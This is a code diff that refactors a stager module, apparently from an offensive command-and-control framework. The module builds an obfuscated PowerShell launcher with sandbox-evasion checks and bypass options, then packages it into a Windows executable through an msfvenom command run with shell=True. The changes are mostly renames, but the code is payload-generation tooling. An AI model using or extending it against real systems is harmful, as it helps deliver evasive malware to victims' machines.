@@ -18,7 +18,7 @@ class Stager:
                 }
             ],
             "Description": "Generates windows command executable using msfvenom to act as a stage 0.",
-            "Comments": [""],
+            "Comments": [],
         }
 
         self.options = {
@@ -45,7 +45,7 @@ class Stager:
                 "Value": "launcher.exe",
             },
             "Obfuscate": {
-                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                 "Required": False,
                 "Value": "False",
                 "SuggestedValues": ["True", "False"],
@@ -57,7 +57,7 @@ class Stager:
                 "Value": r"Token\All\1",
             },
             "SafeChecks": {
-                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
+                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                 "Required": True,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
@@ -101,7 +101,6 @@ class Stager:
         self.main_menu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         obfuscate = self.options["Obfuscate"]["Value"]
@@ -132,7 +131,7 @@ class Stager:
                 )
                 return ""
 
-            self.launcher = self.main_menu.stagers.generate_exe_oneliner(
+            self.launcher = self.main_menu.stagergenv2.generate_exe_oneliner(
                 language=language,
                 obfuscate=invoke_obfuscation,
                 obfuscation_command=obfuscate_command,
@@ -141,17 +140,17 @@ class Stager:
             )
 
         elif language == "powershell":
-            self.launcher = self.main_menu.stagers.generate_launcher(
+            self.launcher = self.main_menu.stagergenv2.generate_launcher(
                 listener_name,
                 language=language,
                 encode=encode,
                 obfuscate=invoke_obfuscation,
                 obfuscation_command=obfuscate_command,
-                userAgent=user_agent,
+                user_agent=user_agent,
                 proxy=proxy,
-                proxyCreds=proxy_creds,
-                stagerRetries=stager_retries,
-                safeChecks=safe_checks,
+                proxy_creds=proxy_creds,
+                stager_retries=stager_retries,
+                safe_checks=safe_checks,
                 bypasses=self.options["Bypasses"]["Value"],
             )
 
@@ -169,9 +168,7 @@ class Stager:
         elif arch == "x86":
             msf_payload = "windows/exec"
 
-        # generate the msfvenom command
         msf_command = f'msfvenom -p {msf_payload} -f {msf_format} CMD="{launcher}"'
 
-        # Run the command and get output
         print(f"[*] MSF command -> {msf_command}")
         return subprocess.check_output(msf_command, shell=True)
